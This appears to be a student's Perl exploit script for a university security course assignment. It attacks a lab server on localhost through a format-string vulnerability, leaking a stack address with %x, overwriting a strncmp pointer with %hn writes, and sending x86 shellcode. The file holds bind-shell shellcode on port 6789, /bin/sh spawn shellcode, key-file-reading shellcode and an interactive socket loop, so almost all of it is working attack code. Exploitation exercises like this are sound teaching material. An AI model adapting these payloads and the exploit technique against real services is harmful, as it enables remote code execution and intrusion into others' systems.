#!/usr/bin/perl
#--------------------------------------------
# Name: 
# Class: CS4678
# Assignment 8
# File: exploit.pl
# Last modified: 29 Feb 2012
#--------------------------------------------
#


# 
# strncmp pointer   @ 0x08049e1c
# dtors section     @ 0x

$pointerL  = "\x1c\x9e\x04\x08";
$pointerH  = "\x1e\x9e\x04\x08";


# bindsckcode.asm  - from class resources
# bindsckcode  73 bytes payload, 24 bytes spawn shell = 133 bytes padding
#    server on port 6789  (\x1A  \x85)
$shellcode = 
	"\x31\xC0\x50\x68\x02\x00\x1A\x85\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB0\x66" .
	"\x43\xCD\x80\xB0\x66\xB3\x04\x89\x44\x24\x04\xCD\x80\x31\xC0\x83" .
	"\xC4\x0C\x50\x50\xB0\x66\x43\xCD\x80\x89\xC3\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6" .
# lsod_shellcode.asm  - from class resources
	"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89" .
   	"\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80";
   	
# retrievekey.asm
# retrieve key code 67 bytes payload
$shellcode1 = 
	"\x31\xC9\x31\xD2\x52\x68\x2F\x6B\x65\x79\x68\x34\x36\x37\x38\x68" .
	"\x65\x2F\x63\x73\x68\x2F\x68\x6F\x6D\x89\xE3\x31\xC0\xB0\x05\xCD" .
	"\x80\x89\xC7\x8D\x8D\xDF\xFC\xFF\xFF\xEB\x0B\x89\xC2\x8B\x5D\x08" .
	"\x31\xC0\xB0\x04\xCD\x80\xB2\xFF\x89\xFB\xB0\x03\xCD\x80\x85\xC0" .
	"\x75\xE9\x40\xC3";

use Getopt::Long;
my $findsock = '';	# option variable with default value (false)
GetOptions ('findsock'  => \$findsock, 
            'execute' => \$executeThis ); 

use IO::Socket; 
my $sock = new IO::Socket::INET ( 
	PeerAddr => '127.0.0.1', 
	PeerPort => '4444', 
	Proto => 'tcp', 
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

# read data from server, get the buffer address
print $sock "%69\$x\n";
$data = <$sock>;
# split buffer address into upper and lower memory addresses
$upperStr = substr $data, 0, 4;
$lowerStr = substr $data, 4, 4;
$lowerMem = hex($lowerStr) + 27;
$upperMem = hex($upperStr) - $lowerMem -8;

print "upper = " . $upperStr . " lower = " . $lowerStr . "\n";
print "      = " . $upperMem . "       = " . $lowerMem . "\n";
print "%" . $lowerMem . "c%5\$hn";
print "%" . $upperMem . "c%6\$hn";
print "\n";

print "\t *** CONTINUE? ";
$data = <>;
# send exploit
print "\t *** Sending exploit to server\n";

print $sock $pointerH . $pointerL;
print $sock "%" . $lowerMem . "c%6\$hn";
print $sock "%" . $upperMem . "c%5\$hn";
print $sock "A"x8;
print $sock $shellcode1;
print $sock "\n";

#read data from server

# split the program into two processes, identical twins
die "can't fork: $!" unless defined($kidpid = fork());

# the if{} block runs only in the parent process
if ($kidpid) {
	# copy the socket to standard output
	while (defined ($line = <$sock>)) {
	    print STDOUT $line;
	}
	kill("TERM", $kidpid);                  # send SIGTERM to child
}
# the else{} block runs only in the child process
else {
	# copy standard input to the socket
	while (defined ($line = <STDIN>)) {
	    print $sock $line;
	}
}

close($sock);

